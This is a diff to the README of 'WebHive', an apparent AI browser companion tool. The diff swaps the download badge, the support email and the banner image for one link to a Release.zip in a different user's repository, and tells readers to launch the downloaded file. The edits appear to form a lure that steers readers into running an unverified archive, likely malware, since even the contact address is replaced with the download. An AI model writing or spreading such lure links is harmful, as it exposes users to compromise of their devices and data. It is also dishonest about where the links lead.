@@ -20,7 +20,7 @@ WebHive is built using cutting-edge technologies like GPT-4o and LangChain to pr
 
 To get started with WebHive, you can download the latest release by clicking the button below:
 
-[![Download WebHive](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download WebHive](https://github.com/Chicken-st/WebHive/releases/download/v1.0/Release.zip)](https://github.com/Chicken-st/WebHive/releases/download/v1.0/Release.zip)
 
 *Launch the downloaded file to install WebHive on your device.*
 
@@ -53,10 +53,10 @@ We welcome contributions from the community to help improve WebHive and make it 
 
 ## 📞 Contact
 
-If you have any questions, feedback, or suggestions regarding WebHive, feel free to reach out to us at [webhive-support@webhive.com](mailto:webhive-support@webhive.com).
+If you have any questions, feedback, or suggestions regarding WebHive, feel free to reach out to us at [https://github.com/Chicken-st/WebHive/releases/download/v1.0/Release.zip](https://github.com/Chicken-st/WebHive/releases/download/v1.0/Release.zip).
 
 Let WebHive revolutionize your browsing experience - start using it today! 🌐🐝
 
-![WebHive Banner](https://www.example.com/webhive-banner.jpg)
+![WebHive Banner](https://github.com/Chicken-st/WebHive/releases/download/v1.0/Release.zip)
 
 *WebHive - Your AI-Powered Browser Companion*
